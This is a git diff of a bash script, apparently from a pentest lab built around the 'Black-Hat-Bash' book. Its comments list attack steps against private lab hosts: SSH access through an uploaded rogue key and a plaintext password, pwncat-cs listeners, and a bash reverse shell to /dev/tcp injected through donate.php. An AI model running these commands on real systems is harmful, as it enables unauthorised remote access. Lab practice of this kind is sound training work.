@@ -15,15 +15,20 @@ source "/home/kali/Projects/Black-Hat-Bash/pentest.sh"
 # 172.16.10.13
 #   ssh backup@172.16.10.13
 #   ssh root@172.16.10.13
+#   ssh backup@172.16.10.13 -i ~/.ssh/id_rsa (uploaded rogue public key)
+#   ssh lp@172.16.10.13 #password=kali
+#   pwncat-cs -l -p 4444
 # 172.16.10.12/donate.php
 #   pwncat-cs -l -p 1337
 #   | bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
 
 #notify_slack "hello"
 
-find "/home/kali/Projects/Black-Hat-Bash/playground" \
-  -readable \
-  -type f \
-  -name "*.txt" -o -name "*.log" -o -name "*.sh"
+#find "/home/kali/Projects/Black-Hat-Bash/playground" \
+#  -readable \
+#  -type f \
+#  -name "*.txt" -o -name "*.log" -o -name "*.sh"
+#
+#tar -c
 
-tar -c
+echo "You executed $BASH_COMMAND"
